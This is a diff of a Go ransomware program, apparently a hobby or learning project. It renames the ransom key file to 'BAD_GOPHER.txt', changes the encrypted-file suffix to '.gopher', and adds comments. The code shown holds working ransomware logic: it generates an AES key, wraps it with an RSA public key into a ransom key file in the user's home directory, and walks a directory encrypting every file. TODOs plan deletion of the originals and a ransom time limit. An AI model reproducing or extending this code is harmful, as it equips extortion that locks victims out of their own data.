@@ -86,6 +86,7 @@ func main() {
 	magicBytes := []byte("RANSOM")
 	// decryptPtr := flag.Bool("decrypt", false, "decrypt with given key")
 
+	// Generate the symmetric AES encryption key
 	key, _ := generateRandomBytes(32)
 
 	fmt.Printf("Symmetric key: %s\n", hex.EncodeToString(key))
@@ -98,12 +99,15 @@ func main() {
 	// privPem, _ := pem.Decode(privRaw)
 	// privKey, _ := x509.ParsePKCS1PrivateKey(privPem.Bytes)
 
+	// Encrypt the symmetric key with the asymmetric public key
+	// TODO: Add timestamp of encryption to the ransom key file so there can be a time limit
 	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(magicBytes, key...), nil)
 
 	home, _ := os.UserHomeDir()
 
+	// Save the decryption key and other information to the disk
 	// TODO: check if key file exists, if so exit program b/c already encrypted
-	keyFile, _ := os.Create(home + "/RANSOM_KEY.txt")
+	keyFile, _ := os.Create(home + "/BAD_GOPHER.txt")
 	keyFile.WriteString(hex.EncodeToString(ciphertext))
 	keyFile.Close()
 
@@ -111,7 +115,7 @@ func main() {
 	// plaintext, _ := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, ciphertext, nil)
 	// fmt.Printf("Plaintext: %s\n", plaintext)
 
-	const suffix = ".enc"
+	const suffix = ".gopher"
 	const startingDirectory = "testdir/"
 
 	// Go through every file in the starting directory and encrypt it
@@ -140,8 +144,13 @@ func main() {
 			return nil
 		}
 
+		// Don't encrypt the decryption key file
+		if strings.Contains(info.Name(), "BAD_GOPHER.txt") {
+			return nil
+		}
+
 		fmt.Println(path, info.Size())
-		encryptFile(path, path+".enc", key)
+		encryptFile(path, path+".gopher", key)
 		// TODO: destroy original file
 		return nil
 	})
